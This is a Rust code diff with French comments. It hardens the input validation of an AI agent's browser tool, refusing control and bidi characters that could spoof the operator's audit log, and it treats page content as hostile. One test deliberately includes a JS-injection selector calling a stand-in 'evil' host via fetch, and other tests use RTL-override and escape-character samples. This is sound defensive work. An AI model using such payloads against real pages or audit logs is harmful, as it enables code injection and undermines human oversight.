@@ -10,15 +10,25 @@
 //! et le plancher de tier (navigate/read/screenshot/click/fill = T1 ; submit = T2 —
 //! ADR-017 décision 2) s'applique avant qu'on arrive ici.
 //!
-//! **Invariant de sécurité ADR-022 encodé ici** : le sélecteur et la valeur fournis
-//! par l'agent sont portés comme **DONNÉES**, destinés à un **binding CDP par objet**
+//! **Invariant de sécurité ADR-022** : le sélecteur et la valeur fournis par l'agent
+//! sont portés comme **DONNÉES**, destinés à un **binding CDP par objet**
 //! (`DOM.querySelector` par paramètre, puis `Input.dispatch*` / `Runtime.callFunctionOn`
 //! avec le nœud en `arguments`) — **jamais interpolés** dans une source
-//! `Runtime.evaluate`. C'est ce qui garde `browser.evaluate` (eval JS arbitraire)
-//! EXCLU au lieu de le réintroduire par la bande : cette couche refuse les formes qui
-//! n'ont de sens que comme injection JS (caractères de contrôle) et remet au transport
-//! des données typées et propres. Le contenu d'une page reste une **entrée hostile**
-//! (invariant du modèle de menace), quel que soit le tier des clics.
+//! `Runtime.evaluate`. C'est ce binding, DANS LE TRANSPORT, qui garde `browser.evaluate`
+//! (eval JS arbitraire) exclu.
+//!
+//! ⚠️ Cette couche **ne peut PAS** rendre sûr un transport qui interpolerait : les
+//! caractères dangereux en JS (`"`, `'`, `` ` ``, `${`, `(`, `.`) sont **acceptés ici**
+//! car un sélecteur CSS légitime en a besoin (`input[name="q"]`, `:has(...)`). Aucun
+//! filtrage de sélecteur ne peut donc empêcher l'injection JS sans casser CSS — le
+//! binding par-objet est la **seule** défense, et le transport DOIT l'appliquer
+//! (invariant à réaffirmer à l'incrément transport ; à y ajouter aussi la ré-assertion
+//! `host_of(url) == host` à la navigation — `derive_domain` extrait déjà l'hôte via le
+//! MÊME `host_of`, donc gouvernance et exécution voient le même hôte). Ce que la
+//! validation ci-dessous protège, c'est la **surface d'audit/CDP** (bornes ; refus des
+//! caractères de contrôle et bidi qui spoofent la ligne d'audit), **pas** l'injection
+//! JS. Le contenu d'une page reste une **entrée hostile** quel que soit le tier des
+//! clics.
 
 // Câblage catalogue + dispatch dans mcp.rs et transport `run_browser` = incréments
 // suivants ; jusque-là, cette couche pure n'est pas encore appelée.
@@ -90,7 +100,9 @@ pub(crate) fn plan_action(verb: &str, args: &Value) -> Result<BrowserAction, Str
         }),
         "fill" => Ok(BrowserAction::Fill {
             selector: validate_selector(req_str(args, "selector", verb)?)?,
-            value: validate_value(req_str(args, "value", verb)?)?,
+            // La valeur DOIT être présente mais PEUT être vide : `fill` avec `""` vide
+            // légitimement un champ (Fable 5).
+            value: validate_value(present_str(args, "value", verb)?)?,
         }),
         "submit" => Ok(BrowserAction::Submit {
             selector: validate_selector(req_str(args, "selector", verb)?)?,
@@ -111,6 +123,14 @@ fn req_str<'a>(args: &'a Value, key: &str, verb: &str) -> Result<&'a str, String
     }
 }
 
+/// Comme `req_str` mais autorise la chaîne vide — pour la valeur d'un `fill`, où `""`
+/// vide légitimement un champ.
+fn present_str<'a>(args: &'a Value, key: &str, verb: &str) -> Result<&'a str, String> {
+    args.get(key)
+        .and_then(Value::as_str)
+        .ok_or_else(|| format!("browser.{verb}: '{key}' manquant"))
+}
+
 /// Un sélecteur CSS est porté tel quel comme **paramètre** de `DOM.querySelector`
 /// (jamais interpolé dans du JS), donc il n'a pas besoin d'échappement JS — mais on
 /// le borne et on refuse les caractères de contrôle, qui n'ont de sens dans un
@@ -123,13 +143,32 @@ fn validate_selector(sel: &str) -> Result<String, String> {
             sel.len()
         ));
     }
-    if let Some(c) = sel.chars().find(|c| c.is_control()) {
+    // Refuse les caractères de contrôle (Cc) ET les marques bidi/format (Cf : RTL
+    // override U+202E, isolats, ZWSP, BOM…) : aucun n'a de sens dans un sélecteur CSS,
+    // et tous cassent ou spoofent la ligne d'audit. `char::is_control()` ne couvre que
+    // Cc, d'où le second test (Fable 5).
+    if let Some(c) = sel
+        .chars()
+        .find(|c| c.is_control() || is_bidi_or_format(*c))
+    {
         return Err(format!(
-            "browser: sélecteur contient un caractère de contrôle ({:#04x}) — refusé",
+            "browser: sélecteur contient un caractère de contrôle/format ({:#06x}) — refusé",
             c as u32
         ));
     }
     Ok(sel.to_string())
+}
+
+/// Marques bidirectionnelles et caractères de format (catégorie Unicode Cf) qui n'ont
+/// jamais de sens dans un sélecteur CSS mais spoofent le rendu de la ligne d'audit.
+/// Liste explicite plutôt qu'une dépendance à une table Unicode.
+fn is_bidi_or_format(c: char) -> bool {
+    matches!(c,
+        '\u{200B}'..='\u{200F}'      // ZWSP/ZWNJ/ZWJ, LRM/RLM
+        | '\u{202A}'..='\u{202E}'    // LRE/RLE/PDF/LRO/RLO
+        | '\u{2060}'                 // word joiner
+        | '\u{2066}'..='\u{2069}'    // isolats LRI/RLI/FSI/PDI
+        | '\u{FEFF}') // BOM / ZWNBSP
 }
 
 /// La valeur d'un `fill` est du texte saisi par l'utilisateur, porté comme DONNÉE
@@ -143,8 +182,20 @@ fn validate_value(val: &str) -> Result<String, String> {
             val.len()
         ));
     }
-    if val.contains('\0') {
-        return Err("browser.fill: valeur contient un octet NUL — refusé".to_string());
+    // Refuse les caractères de contrôle C0/C1 (NUL, mais aussi ESC/BEL/CR/BS…) : rendus
+    // dans la ligne d'audit de l'opérateur, ils y injecteraient des séquences terminal —
+    // or l'audit EST le mécanisme de gouvernance sur un insider non fiable, le corrompre
+    // est l'attaque, pas un détail cosmétique (Fable 5). On garde `\n`/`\t` (légitimes
+    // dans un textarea) et les marques bidi (légitimes en texte RTL) ; l'échappement des
+    // non-imprimables reste une exigence du rendu d'audit (ceinture + bretelles).
+    if let Some(c) = val
+        .chars()
+        .find(|c| c.is_control() && *c != '\n' && *c != '\t')
+    {
+        return Err(format!(
+            "browser.fill: valeur contient un caractère de contrôle ({:#04x}) — refusé",
+            c as u32
+        ));
     }
     Ok(val.to_string())
 }
@@ -233,14 +284,30 @@ mod tests {
     }
 
     #[test]
-    fn control_chars_in_a_selector_are_refused_but_css_punctuation_is_kept() {
-        // Un saut de ligne dans un sélecteur ne sert qu'à casser l'audit / tenter
-        // une injection : refusé.
-        assert!(plan_action("click", &json!({"selector": "a\nb"}))
-            .unwrap_err()
-            .contains("caractère de contrôle"));
-        // La ponctuation CSS légitime passe.
-        for sel in ["#id", ".cls", "div > a", "input[name=\"q\"]", "a:hover"] {
+    fn control_and_bidi_chars_in_a_selector_are_refused_but_css_punctuation_is_kept() {
+        // Un saut de ligne (Cc) ou un RTL-override (Cf, U+202E) ne servent qu'à casser
+        // ou spoofer l'audit : refusés.
+        for bad in ["a\nb", "a\u{202E}b", "a\u{200B}b"] {
+            assert!(
+                plan_action("click", &json!({ "selector": bad }))
+                    .unwrap_err()
+                    .contains("contrôle"),
+                "doit refuser {bad:?}"
+            );
+        }
+        // La ponctuation CSS légitime passe — Y COMPRIS les caractères dangereux-en-JS
+        // (`\"`, `(`, `.`) : cette couche NE filtre PAS l'injection (c'est le binding
+        // par-objet du transport qui protège). Un payload d'injection all-printable
+        // passe donc ici par conception, et c'est correct.
+        for sel in [
+            "#id",
+            ".cls",
+            "div > a",
+            "input[name=\"q\"]",
+            "a:hover",
+            "a:has(> b)",
+            "x\"];fetch('//evil')//",
+        ] {
             assert!(
                 plan_action("click", &json!({ "selector": sel })).is_ok(),
                 "doit accepter {sel:?}"
@@ -249,22 +316,34 @@ mod tests {
     }
 
     #[test]
-    fn a_fill_value_keeps_text_but_refuses_nul_and_bounds_length() {
-        // Accents, ponctuation, saut de ligne (textarea) préservés.
-        let a = plan_action("fill", &json!({"selector": "#c", "value": "café\nligne2"})).unwrap();
+    fn a_fill_value_keeps_text_but_refuses_controls_and_bounds_length() {
+        // Accents, saut de ligne (textarea) et texte RTL (marques bidi) préservés.
+        let a = plan_action("fill", &json!({"selector": "#c", "value": "café\nשלום"})).unwrap();
         assert_eq!(
             a,
             BrowserAction::Fill {
                 selector: "#c".to_string(),
-                value: "café\nligne2".to_string()
+                value: "café\nשלום".to_string()
             }
         );
-        // NUL refusé.
-        assert!(
-            plan_action("fill", &json!({"selector": "#c", "value": "a\0b"}))
-                .unwrap_err()
-                .contains("NUL")
+        // Un champ vidé (valeur "") est légitime.
+        assert_eq!(
+            plan_action("fill", &json!({"selector": "#c", "value": ""})).unwrap(),
+            BrowserAction::Fill {
+                selector: "#c".to_string(),
+                value: String::new()
+            }
         );
+        // ESC/NUL/BEL (caractères de contrôle) refusés — ils corrompraient la ligne
+        // d'audit de l'opérateur.
+        for bad in ["a\u{1b}b", "a\0b", "a\u{07}b"] {
+            assert!(
+                plan_action("fill", &json!({"selector": "#c", "value": bad}))
+                    .unwrap_err()
+                    .contains("caractère de contrôle"),
+                "doit refuser {bad:?}"
+            );
+        }
         // Borne de longueur.
         let long = "x".repeat(MAX_VALUE + 1);
         assert!(
